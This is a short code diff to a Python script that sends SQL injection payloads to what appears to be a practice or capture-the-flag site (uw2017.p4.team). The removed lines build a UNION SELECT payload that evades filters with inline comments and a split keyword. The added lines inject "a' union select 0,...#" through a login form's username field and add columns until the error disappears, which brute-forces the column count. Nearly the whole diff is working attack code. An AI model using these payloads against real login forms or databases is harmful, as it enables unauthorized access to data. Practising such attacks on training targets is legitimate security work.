@@ -10,28 +10,26 @@ def print_ascii(word):
 sess = requests.session()
 
 def login(n):
-    url = 'https://uw2017.p4.team/filtration'
+    url = 'https://uw2017.p4.team/error-sqli'
 
-    base_id = "1/*a*/union/*a*/sel``ect/*a*/0"
+    username_q = "a' union select 0"
 
     for i in range(1, n):
-        base_id += ",{}".format(i)
+        username_q += ",{}".format(i)
 
-    base_id += "/*a*/limit/*a*/1,1"
+    username_q += "#"
 
-    print(base_id)
+    print(username_q)
 
     data = {
-        'id': base_id,
+        'username': username_q,
+        'password': 'asd'
     }
-
-    # print(data)
 
     resp = sess.post(url, data=data)
 
     if not "Fatal error" in resp.text:
         print(resp.text)
-        print(c)
         return True
     return False
 
